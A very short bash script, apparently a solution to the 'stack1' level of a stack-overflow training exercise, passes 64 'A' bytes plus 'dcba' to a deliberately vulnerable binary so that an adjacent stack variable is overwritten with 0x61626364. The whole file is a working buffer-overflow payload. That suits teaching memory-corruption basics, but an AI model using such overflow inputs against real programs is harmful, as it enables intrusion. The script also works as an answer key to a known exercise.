#!/usr/bin/env bash

# Basic buffer overflow that inserts 0x61626364 into the next
# variable on the stack

./stack1 "`python -c \"print 'A' * 64 + 'dcba'\"`"
